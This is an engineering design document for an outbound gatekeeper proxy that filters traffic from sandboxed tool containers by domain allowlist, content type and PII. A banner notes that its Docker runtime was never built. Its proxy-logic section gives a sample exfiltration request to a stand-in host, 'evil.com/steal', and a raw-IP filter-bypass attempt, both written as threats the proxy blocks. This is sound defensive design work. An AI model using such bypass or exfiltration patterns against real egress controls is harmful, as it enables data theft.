# Outbound Gatekeeper

> [!WARNING]
> **Parts of this document describe a Docker-based runtime that was never built.**
> The implemented runtime is WebAssembly via Extism. See
> [STATUS.md](./STATUS.md) for what in this set is accurate and what is
> superseded. Last verified 2026-08-20 against `2d920ce`.

The Gatekeeper is the Core-controlled enforcement point for ALL outbound traffic from the Sandbox. Docker network controls alone are **not sufficient** — the Gatekeeper is a hard requirement.

---

## Why Docker Networks Aren't Enough

Docker networks can isolate containers from the internet (internal-only network) or allow full internet access. But they can NOT:

- Filter by domain name
- Inspect content or MIME types
- Detect PII in outgoing data
- Log what was sent and where
- Apply per-tool policies

The Gatekeeper adds the policy and filtering layer on top of whatever network isolation exists.

---

## Architecture

```
Tool Container ──→ Gatekeeper (Core) ──→ Internet
                       │
                       ├─ Domain allowlist check
                       ├─ Content/MIME type check
                       ├─ PII baseline filter
                       ├─ Logging / audit
                       │
                       └─ ALLOW or DENY
```

All outbound traffic from tool containers **must** pass through the Gatekeeper. There is no direct internet access path.

---

## Filtering Layers

### 1. Domain Allowlist (Hard Filter — Required for Tools)

Each tool declares allowed domains in its manifest:

```json
"permissions": {
  "internet": true,
  "allowed_domains": [
    "api.openai.com",
    "api.anthropic.com"
  ]
}
```

Only these domains are reachable. Everything else is denied. This is the **primary** internet control for tools.

> **Key decision from engineering discussion (2026-03-04):** Hard domain filtering for tools, softer NLP-based filtering for agents. Tools should have explicit allowlists; agents get guardrails.

### 2. Content / MIME Type Check

The Gatekeeper inspects outbound payloads:

- Block unexpected content types (e.g., tool claims to be an API caller but sends binary data)
- Flag large payloads
- Detect encoded/obfuscated content

### 3. PII Baseline Filter (v1 — Simple Rules)

A generic PII baseline using lightweight techniques:

- **Regex-based detection:** email addresses, phone numbers, SSNs, credit card numbers
- **Named Entity Recognition (NER):** detect person names, addresses (lightweight NLP)
- Action: flag, redact, or block based on policy

> v1 aims for at least a simple PII baseline. LLM-assisted filtering can be added later.

### 4. Logging / Audit

Every outbound request is logged:

```json
{
  "timestamp": "2026-03-04T15:00:00Z",
  "tool_id": "python-data-analyzer",
  "destination": "api.openai.com",
  "method": "POST",
  "content_type": "application/json",
  "payload_size": 1523,
  "action": "ALLOWED",
  "pii_flags": []
}
```

Logs are append-only and part of the tool's Chronicle.

---

## Cross-Platform: Why This Works Everywhere

> **Docker containers are always Linux.** Even on macOS and Windows, Docker Desktop runs a hidden Linux VM. All containers execute inside it.

This means:

- **iptables / network rules** → run inside Docker's Linux VM → ✅ works on all platforms
- **Docker network configuration** → applied inside the Linux VM → ✅ works on all platforms
- **DNS configuration per container** → Docker feature → ✅ works on all platforms

**The Gatekeeper does NOT need anything installed on the host OS.** All networking enforcement happens inside Docker's own infrastructure. The user's macOS, Windows, or Linux machine is irrelevant for the networking layer.

---

## Implementation: v1 Simplest Approach

### The Proxy-as-Only-Exit Pattern (Recommended for v1)

The simplest v1 approach: **make the Gatekeeper the ONLY way out of the container's network.** No iptables configuration needed.

```
┌─────────────────────────────────────────────────────┐
│             Docker Network: mosaic-internal          │
│             (NO default internet access)             │
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │  Tool A  │  │  Tool B  │  │  Tool C  │          │
│  │          │  │          │  │          │          │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘          │
│       │              │              │                │
│       └──────────────┼──────────────┘                │
│                      │                               │
│              ┌───────┴────────┐                      │
│              │   GATEKEEPER   │ ← only node with     │
│              │   (proxy)      │   internet access     │
│              └───────┬────────┘                      │
│                      │                               │
└──────────────────────┼───────────────────────────────┘
                       │
                   INTERNET
```

**How it works:**

1. Create a Docker network (`mosaic-internal`) that has **no internet access** by default
2. Run tool containers on this network — they physically cannot reach the internet
3. The Gatekeeper container (or Core process) is the **only node** on this network that also has an external connection
4. Tool containers set `HTTP_PROXY` / `HTTPS_PROXY` env vars pointing to the Gatekeeper
5. All outbound traffic from tools MUST go through the Gatekeeper proxy
6. The Gatekeeper checks: is this domain on the tool's manifest allowlist? → allow or block

**Why this is the simplest approach:**

- No iptables configuration
- No DNS proxy needed (the HTTP proxy handles domain filtering)
- No IP resolution caching or refresh
- Standard `HTTP_PROXY` env var — most libraries respect it out of the box
- Docker handles all the networking isolation natively

**HTTPS handling:**

- The proxy can see the **domain name** via the CONNECT method (SNI / Host header)
- The proxy CANNOT see the request body (encrypted)
- For v1, domain-level filtering on HTTPS is sufficient

### What the proxy sees

| Protocol | Domain visible?      | Path/URL visible? | Body visible? | Can filter by domain? |
| -------- | -------------------- | ----------------- | ------------- | --------------------- |
| HTTP     | ✅ Yes               | ✅ Yes            | ✅ Yes        | ✅ Yes                |
| HTTPS    | ✅ Yes (CONNECT/SNI) | ❌ No             | ❌ No         | ✅ Yes                |

### Container configuration at launch

```bash
docker run \
  --network=mosaic-internal \          # No internet by default
  -e HTTP_PROXY=http://gatekeeper:8080 \
  -e HTTPS_PROXY=http://gatekeeper:8080 \
  -e NO_PROXY=localhost,mosaic-core \  # Allow local communication
  registry.mosaic.ai/tool-name:1.0.0
```

The tool developer doesn't need to know about the proxy. Their `fetch()`, `axios`, `requests` calls work normally — the env var redirects them transparently.

### Gatekeeper proxy logic (simplified)

```
1. Tool sends: CONNECT api.openai.com:443
2. Gatekeeper checks: is "api.openai.com" in this tool's manifest allowlist?
   → YES: forward the CONNECT, establish tunnel
   → NO:  return 403 Forbidden, log the attempt
3. Tool sends: GET http://evil.com/steal
   → Gatekeeper checks: is "evil.com" in allowlist?
   → NO: return 403, log it
```

### What about raw IP bypass?

A tool could try `fetch("https://104.18.6.192/...")` to bypass domain filtering.

**v1 mitigation:** Since the tool is on `mosaic-internal` with no internet, even raw IP connections go through the proxy (the proxy is the only route). The proxy can reject requests to raw IPs (no Host header or an IP-only Host) — if it's not a domain on the allowlist, block it.

**v2 hardening (Barry's full approach):** Add DNS proxy + IP filtering for defense in depth:

- Resolve allowed domains → cache their IPs
- Add network rules so only those IPs are reachable even through the proxy
- Periodically re-resolve (every 5 min) to handle DNS changes

### Jhonatan building proof of concepts (Mar 05)

Jhonatan confirmed (Mar 05 daily) he's building proof-of-concept implementations to verify the networking approach works before integration into MosAIc. Barry agreed to review the security-sensitive code.

> **Barry confirmed (Mar 05 daily):** DNS-only filtering is NOT enough. "If we allow the server to contact any IP at all, then it could just go to the IP directly and bypass the DNS." The IP-level filtering is mandatory — but with the proxy-as-only-exit pattern, this is handled structurally (no direct internet access).

---

## Options Considered (for reference)

### Option A: HTTP/HTTPS Proxy Only (← v1 recommendation, see above)

```
Container → HTTP_PROXY → Gatekeeper Proxy → Internet
```

- Standard `HTTP_PROXY` / `HTTPS_PROXY` env vars
- Proxy handles domain filtering for both HTTP and HTTPS (via CONNECT)
- Simple, well-understood, cross-platform via Docker

### Option B: DNS Proxy

```
Container → DNS query → Mosaic DNS resolver → resolve or deny
Container → direct IP connection → Internet
```

- Set container DNS to Mosaic's DNS resolver
- Resolver only resolves domains on the allowlist
- **Problem (confirmed by Barry, Mar 05):** tool can bypass DNS with raw IPs
- Not sufficient alone — needs IP filtering too

### Option C: DNS + IP Filtering (Barry's Full Recommendation)

```
1. At tool launch, resolve allowed domains → get IP addresses
2. Set up IP-based filtering (via iptables, Docker network rules, or proxy rules)
3. Only allowed IPs are reachable
4. DNS in container points to Mosaic resolver (for domain resolution)
```

- Most robust defense-in-depth approach
- **Good for v2 hardening** on top of the proxy approach
- More complex to implement and maintain (IP caching, refresh intervals)

---

## Agents vs Tools: Different Filtering Strategies

| Aspect              | Tools                                              | Agents                                                 |
| ------------------- | -------------------------------------------------- | ------------------------------------------------------ |
| **Internet filter** | Hard domain allowlist (from manifest)              | Soft guardrails                                        |
| **Content filter**  | MIME type checks                                   | NLP / NER-based PII detection                          |
| **Bypass risk**     | Low (network-level enforcement)                    | Medium (can be creative)                               |
| **Why different**   | Tools are code — deterministic, can be locked down | Agents are dynamic — need flexibility with guard rails |

---

## Configuration

### Global Rules

- Default PII patterns to always block/redact
- Global domain blocklist (known malware, trackers)
- Maximum payload size

### Per-Tool Rules (from Profile)

- Allowed domains (from manifest)
- Content type filters
- Custom PII rules

### Profiles

A profile is selected at tool launch:

- **strict** — deny-by-default, no internet
- **limited** — manifest-declared domains only, basic PII check
- **relaxed** — allow most traffic, log everything (dev/testing)

Tool may recommend a profile; user may override.

---

## Data Ingestion Side (Future — Not v1)

Robert raised (Mar 03 meeting): content filtering may be needed at **two** boundaries:

1. **Outbound Gatekeeper** (this doc) — filters what tools/agents send OUT
2. **Data Ingestion** — filters what data is loaded INTO MosAIc/chats from external sources

Example: Email data → loaded into chat → sent to OpenAI → PII leaks.

> Not Phase 1 priority. Focus on the outbound Gatekeeper first.

---

## Design History

### Initial Socket Idea (Rejected)

Jhonatan initially proposed: cut off internet entirely, provide a TCP socket from the container to MosAIc, and have MosAIc proxy all external calls.

**Why rejected** (Barry, Mar 04): "If you make it a socket, it would be difficult to actually use it. Tools use libraries/SDKs that expect to talk to URLs directly."

### DNS-Only Approach (Rejected)

Jhonatan considered (Mar 05): using only a local DNS resolver to filter domains, without IP filtering. "An IP table won't be required because we can just have a local DNS keeping track of the IPs."

**Barry's response (Mar 05):** "If we allow the server to contact any IP at all, then it could just go to the IP directly and bypass the DNS." DNS alone is not sufficient.

**Resolution:** The proxy-as-only-exit pattern solves this structurally — there is no direct internet path to bypass.

### Firewall Analogy (Robert)

Robert compared the Gatekeeper to an advanced firewall doing packet inspection and modification. Jhonatan pushed back: "Instead of modifying, just restricting."

**Decision:** Gatekeeper blocks or allows. It does NOT rewrite requests in v1.

### NLP for Gatekeeper (Scoped Down)

Barry: "NLP/MIME checks are easy to bypass. For tools, I would prefer hard security checks — specific domain allowlists. NLP guardrails are fine for agents."

**Decision:** NLP-based filtering is for agent guardrails. Tools get hard domain allowlists.

---

## Tool Development: Dependencies Must Be Build-Time

From Mar 05 daily (Barry + Jhonatan):

> "Most times when you build a Docker image, that's the understanding — you don't want to download at runtime."

Tools must install all dependencies during `docker build`, not at runtime. This is important because:

- Runtime installs require internet access (which may be restricted)
- Runtime installs can break (package removed from repo, version conflicts)
- Build-time locking ensures reproducibility

This is enforced by the `--read-only` filesystem flag — tools cannot write to their own filesystem at runtime.

---

## Research Tasks

- [x] ~~Test IP filtering via iptables~~ → Not needed for v1 (proxy-as-only-exit handles it)
- [ ] Prototype a Node.js HTTP/HTTPS proxy with domain allowlisting (CONNECT method)
- [ ] Test `HTTP_PROXY` / `HTTPS_PROXY` env var with popular libraries (requests, axios, fetch, curl)
- [ ] Verify Docker internal network truly blocks direct internet (no iptables tweaks needed)
- [ ] Research NLP libraries for PII detection (spaCy NER, compromise.js) — for agents, not tools
- [ ] Jhonatan's proof of concepts → review when ready

---

## Open Questions

1. Exact PII rule set for v1 baseline — what patterns to include?
2. Which Node.js proxy library to use? (`http-proxy`, `node-http-proxy`, custom?)
3. How to handle WebSocket connections through the proxy?
4. Should the Gatekeeper log request bodies (for HTTP) or only metadata?
5. How to handle tools that need to upload large files to allowed APIs?
6. CDN/shared IP concern — if we add IP filtering in v2, can we handle Cloudflare-style shared IPs?
